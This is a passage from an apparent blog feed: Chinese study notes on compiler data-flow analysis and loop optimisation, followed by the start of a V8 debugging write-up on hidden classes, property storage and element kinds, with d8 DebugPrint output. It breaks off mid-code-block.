src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-140931.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141008.png" alt=""><h3 id="强度削弱"><a href="#强度削弱" class="headerlink" title="强度削弱"></a>强度削弱</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141029.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141118.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141528.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141551.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141601.png" alt=""><h3 id="基本块的优化"><a href="#基本块的优化" class="headerlink" title="基本块的优化"></a>基本块的优化</h3><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-141902.png" alt=""></li></ul></li></ul><h2 id="数据流分析"><a href="#数据流分析" class="headerlink" title="数据流分析"></a>数据流分析</h2><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-151922.png" alt=""><br>s是一个语句，所以说数据流值在经过s之后会变化发，所谓传递函数。</p><h3 id="到达定值分析"><a href="#到达定值分析" class="headerlink" title="到达定值分析"></a>到达定值分析</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-152723.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153258.png" alt=""><br>注意KILL这个概念，是变量x被重新赋值，则原来的定值（语句）被杀死。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153356.png" alt=""> </p><h4 id="到达定值分析的用途"><a href="#到达定值分析的用途" class="headerlink" title="到达定值分析的用途"></a>到达定值分析的用途</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153721.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153828.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153905.png" alt=""></p><h4 id="杀死与生成"><a href="#杀死与生成" class="headerlink" title="杀死与生成"></a>杀死与生成</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-153944.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-154554.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-154644.png" alt=""></p><h4 id="到达定值分析的算法"><a href="#到达定值分析的算法" class="headerlink" title="到达定值分析的算法"></a>到达定值分析的算法</h4><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-160029.png" alt=""><br>kill置为0，gen置为1<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-160049.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-08-160351.png" alt=""></p><h3 id="活跃变量分析"><a href="#活跃变量分析" class="headerlink" title="活跃变量分析"></a>活跃变量分析</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-132942.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-133257.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-133312.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-133357.png" alt=""><br>活跃变量就是定义了以后会被用到嘛2333</p><p>因为这是一个逆向数据流问题，所以用x表示在基本块出口处的活跃变量的集合，f(x)表示基本块入口处活跃变量的集合。</p><p>use表示在基本块中首次出现，以引用形式出现的变量的集合，所以这些变量在基本块入口处肯定是活跃的。</p><p>def表示在基本块中首次出现，以定值形式出现的变量的集合，所以这些变量在基本块入口处肯定是不活跃的。<br>所以说def杀死了某些变量在基本块入口处成为活跃变量的可能性。</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-133603.png" alt=""><br>解释一下B2，i和j在基本块B2中都是以引用形式首次出现，所以在use里，而def为∅<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-135226.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-135254.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-135308.png" alt=""><br>得到活跃变量表<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-140845.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-140935.png" alt=""></p><h3 id="可用表达式分析"><a href="#可用表达式分析" class="headerlink" title="可用表达式分析"></a>可用表达式分析</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-141147.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-141741.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-141807.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-141913.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-142025.png" alt=""><br>z=x op y生成了表达式x op y，加入gen<br>同时这条语句对z定值，于是删除与z相关的表达式。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-142153.png" alt=""><br>z = x op y，于是从kill中删除表达式x op y，代表它复活了。<br>同时这条语句对z定值，于是把和z相关的表达式加入kill中</p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-142219.png" alt=""><br><strong>注意是IN的交集</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-143437.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-143405.png" alt=""></p><h2 id="对循环的优化"><a href="#对循环的优化" class="headerlink" title="对循环的优化"></a>对循环的优化</h2><p>要想对循环进行优化，首先要识别出流图中的循环。</p><h3 id="支配节点（Dominators-和回边"><a href="#支配节点（Dominators-和回边" class="headerlink" title="支配节点（Dominators)和回边"></a>支配节点（Dominators)和回边</h3><ul><li>支配节点<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-144116.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-144133.png" alt=""><br>在支配节点树中，每个节点只支配它和它的后代节点。<br>可以看出一个节点可能会有若干个支配节点，于是给出直接支配节点的定义<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-144340.png" alt=""><br>寻找支配节点是一个数据流问题<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-144426.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-145018.png" alt=""></li></ul><p><strong>注意交运算，所以初始化时初始为全集</strong><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-145033.png" alt=""></p><ul><li>回边<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-151633.png" alt=""></li></ul><h3 id="自然循环及其识别"><a href="#自然循环及其识别" class="headerlink" title="自然循环及其识别"></a>自然循环及其识别</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-151758.png" alt=""><br>如图2和3不存在彼此支配的关系，2和3构成了一个循环，控制既可以从2，也可以从3号节点进入，这样循环的入口节点就不唯一了。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152115.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152330.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152636.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152727.png" alt=""></p><h3 id="删除全局子表达式"><a href="#删除全局子表达式" class="headerlink" title="删除全局子表达式"></a>删除全局子表达式</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152910.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-152950.png" alt=""></p><h3 id="删除复制语句"><a href="#删除复制语句" class="headerlink" title="删除复制语句"></a>删除复制语句</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-153333.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-154117.png" alt=""><br>注意到达定义分析是并 IN[P]，可用表达式分析是交 IN[P]</p><h3 id="代码移动"><a href="#代码移动" class="headerlink" title="代码移动"></a>代码移动</h3><ul><li>循环不变计算</li><li>代码外提<h4 id="循环不变计算"><a href="#循环不变计算" class="headerlink" title="循环不变计算"></a>循环不变计算</h4>一条语句是循环不变，当且仅当运算分量的值在循环中不变</li></ul><ol><li>运算分量是常数</li><li>运算分量的所有定值点在循环以外</li><li>运算分量只有一个到达定值，且在循环以内，且该定值本身就是循环内的一个不变计算。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-154548.png" alt=""><h4 id="代码外提"><a href="#代码外提" class="headerlink" title="代码外提"></a>代码外提</h4><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-154657.png" alt=""></li></ol><p>注意不一定所有的循环不变量都能外提<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-154741.png" alt=""><br>如图，B2并不一定被执行，那么其中的代码外提就是错误的。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-155000.png" alt=""><br>如果还有其他语句对x赋值，那么就有可能让原来的定值语句被杀死。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-155424.png" alt=""></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-155708.png" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-08-12-160015.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;什么是基本块？&quot;&gt;&lt;a href=&quot;#什么是基本块？&quot; class=&quot;headerlink&quot; title=&quot;什么是基本块？&quot;&gt;&lt;/a&gt;什么是基本块？&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;https://sakura-1252236262.cos.ap-beijing
      
    
    </summary>
    
    
      <category term="浏览器" scheme="http://eternalsakura13.com/categories/%E6%B5%8F%E8%A7%88%E5%99%A8/"/>
    
    
      <category term="compiler" scheme="http://eternalsakura13.com/tags/compiler/"/>
    
  </entry>
  
  <entry>
    <title>v8 debug writeup</title>
    <link href="http://eternalsakura13.com/2018/08/02/v8_debug/"/>
    <id>http://eternalsakura13.com/2018/08/02/v8_debug/</id>
    <published>2018-08-02T14:05:42.000Z</published>
    <updated>2018-10-22T14:25:51.729Z</updated>
    
    <content type="html"><![CDATA[<h2 id="v8-hidden-class-test"><a href="#v8-hidden-class-test" class="headerlink" title="v8 hidden class test"></a>v8 hidden class test</h2><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><h4 id="test1"><a href="#test1" class="headerlink" title="test1"></a>test1</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">this</span>.x = x;</span><br><span class="line"> <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">10</span>, <span class="number">11</span>);</span><br><span class="line">%DebugPrint(p1)</span><br><span class="line"><span class="keyword">var</span> p2 = <span class="keyword">new</span> Point(<span class="number">12</span>, <span class="number">13</span>);</span><br><span class="line">%DebugPrint(p2)</span><br></pre></td></tr></table></figure><p><code>./d8 --allow_natives_syntax test_hidden_class.js</code><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-14-131739.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ .&#x2F;d8 --allow_natives_syntax test.js </span><br><span class="line">DebugPrint: 0x27984250c879: [JS_OBJECT_TYPE]</span><br><span class="line"> - map &#x3D; 0x1e016e18f8d9 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x27984250c749</span><br><span class="line"> - elements &#x3D; 0x23ac56e02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties &#x3D; 0x23ac56e02241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 10 (data field 0)</span><br><span class="line">    #y: 11 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x1e016e18f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e016e18f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x27984250c919 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x27984250c749 &lt;Object map &#x3D; 0x1e016e18f829&gt;</span><br><span class="line"> - constructor: 0x2672a3c30041 &lt;JSFunction Point (sfi &#x3D; 0x2672a3c2fc91)&gt;</span><br><span class="line"> - code cache: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x27984250c969: [JS_OBJECT_TYPE]</span><br><span class="line"> - map &#x3D; 0x1e016e18f8d9 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x27984250c749</span><br><span class="line"> - elements &#x3D; 0x23ac56e02241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties &#x3D; 0x23ac56e02241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x1e016e18f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x1e016e18f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x27984250c919 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x27984250c749 &lt;Object map &#x3D; 0x1e016e18f931&gt;</span><br><span class="line"> - constructor: 0x2672a3c30041 &lt;JSFunction Point (sfi &#x3D; 0x2672a3c2fc91)&gt;</span><br><span class="line"> - code cache: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x23ac56e02241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br></pre></td></tr></table></figure><p>结论：相同的map值</p><h4 id="test2"><a href="#test2" class="headerlink" title="test2"></a>test2</h4><p>add p2.z = 14;<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-074842.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~&#x2F;v8&#x2F;v8&#x2F;out.gn&#x2F;x64.debug$ .&#x2F;d8 --allow_natives_syntax test.js </span><br><span class="line">DebugPrint: 0x252f4f50c891: [JS_OBJECT_TYPE]</span><br><span class="line"> - map &#x3D; 0x2d1249b8f8d9 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x252f4f50c761</span><br><span class="line"> - elements &#x3D; 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties &#x3D; 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 10 (data field 0)</span><br><span class="line">    #y: 11 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x2d1249b8f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x252f4f50c931 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map &#x3D; 0x2d1249b8f829&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi &#x3D; 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x252f4f50c981: [JS_OBJECT_TYPE]</span><br><span class="line"> - map &#x3D; 0x2d1249b8f8d9 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x252f4f50c761</span><br><span class="line"> - elements &#x3D; 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties &#x3D; 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line"> &#125;</span><br><span class="line">0x2d1249b8f8d9: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 8</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f881 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #2: 0x252f4f50c931 &lt;FixedArray[8]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map &#x3D; 0x2d1249b8f931&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi &#x3D; 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br><span class="line"></span><br><span class="line">DebugPrint: 0x252f4f50c981: [JS_OBJECT_TYPE]</span><br><span class="line"> - map &#x3D; 0x2d1249b8f989 [FastProperties]</span><br><span class="line"> - prototype &#x3D; 0x252f4f50c761</span><br><span class="line"> - elements &#x3D; 0x538c1f82241 &lt;FixedArray[0]&gt; [FAST_HOLEY_ELEMENTS]</span><br><span class="line"> - properties &#x3D; 0x538c1f82241 &lt;FixedArray[0]&gt; &#123;</span><br><span class="line">    #x: 12 (data field 0)</span><br><span class="line">    #y: 13 (data field 1)</span><br><span class="line">    #z: 14 (data field 2)</span><br><span class="line"> &#125;</span><br><span class="line"> 0x2d1249b8f989: [Map]</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: 104</span><br><span class="line"> - inobject properties: 10</span><br><span class="line"> - elements kind: FAST_HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: 7</span><br><span class="line"> - enum length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: 0x2d1249b8f8d9 &lt;Map(FAST_HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - instance descriptors (own) #3: 0x252f4f50ca51 &lt;FixedArray[11]&gt;</span><br><span class="line"> - layout descriptor: 0</span><br><span class="line"> - prototype: 0x252f4f50c761 &lt;Object map &#x3D; 0x2d1249b8f931&gt;</span><br><span class="line"> - constructor: 0x3be1e3530089 &lt;JSFunction Point (sfi &#x3D; 0x3be1e352fc91)&gt;</span><br><span class="line"> - code cache: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - dependent code: 0x538c1f82241 &lt;FixedArray[0]&gt;</span><br><span class="line"> - construction counter: 6</span><br></pre></td></tr></table></figure><p>结论：指向一个新的map</p><h3 id="property的管理方法"><a href="#property的管理方法" class="headerlink" title="property的管理方法"></a>property的管理方法</h3><h4 id="In-Object-Properties"><a href="#In-Object-Properties" class="headerlink" title="In-Object Properties"></a>In-Object Properties</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Point</span>(<span class="params">x, y</span>) </span>&#123;</span><br><span class="line"> <span class="keyword">this</span>.x = x;</span><br><span class="line"> <span class="keyword">this</span>.y = y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> p1 = <span class="keyword">new</span> Point(<span class="number">10</span>, <span class="number">11</span>);</span><br><span class="line">%DebugPrint(p1)</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-18-144639.png" alt="">V8支持所谓的对象内属性，它们被直接保存在对象上，和对象在同一块内存区域。这种属性是V8中速度最快的属性，能够被直接访问。对象内属性的个数由对象初始化大小决定。如果要添加的属性超出对象的大小，这些属性就会被放入properties store中。properties store会增加一层属性访问的消耗，但是不受大小的限制。 </p><h4 id="Fast-Properties"><a href="#Fast-Properties" class="headerlink" title="Fast Properties"></a>Fast Properties</h4><p>一般来说，我们会把属性保存在线性的properties store中，作为快速属性。快速属性可以通过简单的索引在properties store中访问。不过为了从属性名从properties store获取实际位置，我们要去HiddenClass上的 descriptor array中查询 。具体来讲，这一步骤是先根据属性名搜寻隐藏类的descriptor array，然后得到到数组的偏移地址，然后根据偏移地址到properties store上读取属性信息。实际上，第一次查找属性的时候难免会经历一次隐藏类的哈希查找，但下次一般会结合内联缓存，直接采用缓存的位移来存取属性。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-080119.jpg" alt=""></p><h4 id="Slow-Properties"><a href="#Slow-Properties" class="headerlink" title="Slow Properties"></a>Slow Properties</h4><p>  然而，若是有很多属性从对象上添加或者删除，就需要花费很多时间和内存来维护descriptor array以及隐藏类。因此，V8也支持所谓的慢属性。拥有慢属性的对象会拥有一个自给的字典作为它的properties store（如上图所示）。这种情况下，所有属性的元信息不再储存在隐藏类的descriptor array中，而是直接保存在属性字典上。因此，此时属性的添加和移除不用再去更新指向的隐藏类。因为内联缓存不适用保存在字典中的属性，所以慢属性一般要比快属性慢。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-06-16-080209.jpg" alt=""></p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>列表内容有三种不同类型的命名属性：对象内属性，快属性，以及慢/字典属性。<br>  1. 对象内属性直接储存在对象自身上，提供最快的属性访问。<br>  2. 快属性活跃在properties store上，所有相关的元信息都在隐藏类的descriptor array中。<br>  3. 慢属性保存在一个自给的属性字典上，属性的元信息不再与隐藏类有关。<br>慢属性提供高效的属性添加删除，但是访问速度要慢于快速属性和对象内对象。</p><h2 id="Elements-or-array-indexed-Properties"><a href="#Elements-or-array-indexed-Properties" class="headerlink" title="Elements or array-indexed Properties"></a>Elements or array-indexed Properties</h2><p>  目前为止我们介绍了命名属性并且忽略了通常出现在数组中的整数索引属性。处理这种整数型属性要比命名属性简单很多。<br>所有的整数型属性都被单独保存在一个elements store中，并且有多达20种元素类型。</p><h3 id="Packed-or-Holey-Elements"><a href="#Packed-or-Holey-Elements" class="headerlink" title="Packed or Holey Elements"></a>Packed or Holey Elements</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> o = [<span class="string">"a"</span>, <span class="string">"b"</span>, <span class="string">"c"</span>];</span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "b".</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line"><span class="keyword">delete</span> o[<span class="number">1</span>];                <span class="comment">// Introduces a hole in the elements store.</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "undefined"; property 1 does not exist.</span></span><br><span class="line">o.__proto__ = &#123;<span class="number">1</span>: <span class="string">"B"</span>&#125;;     <span class="comment">// Define property 1 on the prototype.</span></span><br><span class="line">%DebugPrint(o)</span><br><span class="line">print(o[<span class="number">0</span>]);          <span class="comment">// Prints "a".</span></span><br><span class="line">print(o[<span class="number">1</span>]);          <span class="comment">// Prints "B".</span></span><br><span class="line">print(o[<span class="number">2</span>]);          <span class="comment">// Prints "c".</span></span><br><span class="line">print(o[<span class="number">3</span>]);          <span class="comment">// Prints undefined</span></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span 